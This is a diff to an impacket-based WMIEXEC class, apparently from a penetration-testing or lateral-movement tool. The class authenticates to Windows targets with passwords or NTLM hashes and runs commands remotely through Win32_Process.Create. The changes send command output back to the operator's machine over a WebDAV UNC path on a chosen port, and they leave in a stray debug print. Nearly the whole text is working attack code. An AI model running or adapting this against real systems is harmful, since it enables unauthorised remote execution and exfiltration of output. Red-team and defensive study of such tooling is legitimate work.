@@ -13,7 +13,7 @@ from impacket.dcerpc.v5.dtypes import NULL
 
 
 class WMIEXEC:
-    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None):
+    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None, port="80"):
         self.__target = target
         self.__username = username
         self.__password = password
@@ -30,6 +30,7 @@ class WMIEXEC:
         self.__aesKey = None
         self.__doKerberos = False
         self.__retOutput = True
+        self.__port = port
 
         if hashes is not None:
             if hashes.find(':') != -1:
@@ -78,6 +79,7 @@ class WMIEXEC:
                 self.cd('\\')
                 self.execute_remote(data)
         else:
+            print("llll")
             self.execute_remote(data)
 
     def execute_remote(self, data):
@@ -92,7 +94,7 @@ class WMIEXEC:
     def execute_fileless(self, data):
         self.__output = gen_random_string(6)
         local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]
-        command = self.__shell + data + ' 1> \\\\{}\\tmp\\{} 2>&1'.format(local_ip, self.__output)
+        command = self.__shell + data + ' 1> \\\\{}@{}\\misc\\tmp\\{} 2>&1'.format(local_ip, self.__port, self.__output)
         logging.debug('Executing command: ' + command)
         self.__win32Process.Create(command, self.__pwd, None)
         self.get_output_fileless()
